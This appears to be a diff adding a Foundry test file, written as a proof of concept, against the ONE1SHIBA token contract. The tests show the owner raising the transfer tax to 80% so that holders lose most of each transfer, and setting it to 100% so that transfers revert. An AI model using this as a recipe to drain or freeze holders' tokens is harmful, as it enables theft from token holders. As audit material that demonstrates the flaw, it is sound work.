@@ -1,0 +1,81 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0; // Foundry compatible
+
+import "forge-std/Test.sol";
+
+interface IONE1SHIBA {
+    function owner() external view returns (address);
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function setTaxFeePercent(uint256 taxFee) external;
+    function isExcludedFromFee(address) external view returns (bool);
+    function setLiquidityFeePercent(uint256 liquidityFee) external;
+    function _taxFee() external view returns (uint256);
+    function _liquidityFee() external view returns (uint256);
+}
+
+contract ExploitTest is Test {
+    address constant ONE1SHIBA = 0xcc21ec2C6867AC6EFD9cE158996fF47AB5743B2d;
+    IONE1SHIBA token = IONE1SHIBA(ONE1SHIBA);
+
+    address owner;
+    address victim = address(0x1234);
+    address recipient = address(0x5678);
+    uint256 constant DECIMALS = 1e9;
+
+    function setUp() public {
+        owner = token.owner();
+        vm.label(owner, "Owner");
+        vm.label(victim, "Victim");
+        vm.label(recipient, "Recipient");
+    }
+
+    function testHighTaxFeeManipulation() public {
+        // Fund victim with tokens from owner (owner is excluded from fee)
+        uint256 fundAmount = 1000 * DECIMALS; // 1000 tokens
+        vm.startPrank(owner);
+        token.transfer(victim, fundAmount);
+        vm.stopPrank();
+
+        // Verify victim received full amount
+        assertEq(token.balanceOf(victim), fundAmount);
+
+        // Owner sets tax fee to 80% (extreme)
+        vm.prank(owner);
+        token.setTaxFeePercent(80);
+        // Check the fee was updated
+        assertEq(token._taxFee(), 80);
+
+        // Victim transfers 100 tokens to recipient
+        uint256 transferAmount = 100 * DECIMALS;
+        vm.startPrank(victim);
+        token.transfer(recipient, transferAmount);
+        vm.stopPrank();
+
+        // After the transfer, recipient should have received only 12% (since 80% tax + 8% liquidity = 88% fee)
+        uint256 expectedRecipient = transferAmount * 12 / 100; // 12 tokens
+        uint256 actualRecipient = token.balanceOf(recipient);
+        // Tolerance due to rounding in reflection mechanism
+        assertApproxEqAbs(actualRecipient, expectedRecipient, DECIMALS, "Recipient should receive approximately 12% of transferred amount");
+
+        // Victim's balance decreased by the full transfer amount
+        assertEq(token.balanceOf(victim), fundAmount - transferAmount);
+    }
+
+    function testOwnerCanSetFeeToMaxCausingRevert() public {
+        // Demonstrates that owner can set taxFee to 100% causing transfer to revert (underflow)
+        vm.prank(owner);
+        token.setTaxFeePercent(100);
+        // Attempt a transfer from a non-excluded user should revert
+        uint256 fundAmount = 100 * DECIMALS;
+        vm.startPrank(owner);
+        token.transfer(victim, fundAmount);
+        vm.stopPrank();
+
+        vm.prank(victim);
+        vm.expectRevert(); // Underflow in tTransferAmount calculation
+        token.transfer(recipient, 1 * DECIMALS);
+    }
+}
+```
